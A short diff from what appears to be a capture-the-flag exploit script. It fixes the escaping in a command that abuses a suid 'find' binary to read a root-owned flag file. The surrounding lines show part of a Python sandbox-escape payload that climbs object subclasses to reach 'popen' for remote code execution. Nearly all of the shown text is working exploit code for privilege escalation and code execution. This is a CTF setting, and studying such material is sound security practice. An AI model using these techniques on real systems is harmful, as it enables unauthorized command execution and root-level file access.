@@ -71,7 +71,7 @@ def flag_two(host: str, port: int) -> str:
     # With RCE as `referee`, /usr/bin/find has the suid bit set
     # (GTFOBins classic), so `find . -exec cat /root/root_flag.txt ;`
     # reads the root flag because cat inherits EUID=0 from find.
-    cmd = "/usr/bin/find /tmp -maxdepth 0 -exec /bin/cat /root/root_flag.txt ;"
+    cmd = r"/usr/bin/find /tmp -maxdepth 0 -exec /bin/cat /root/root_flag.txt \;"
     expression = (
         "[c for c in ().__class__.__mro__[-1].__subclasses__()"
         " if c.__name__ == '_wrap_close'][0].__init__.__globals__['popen']"
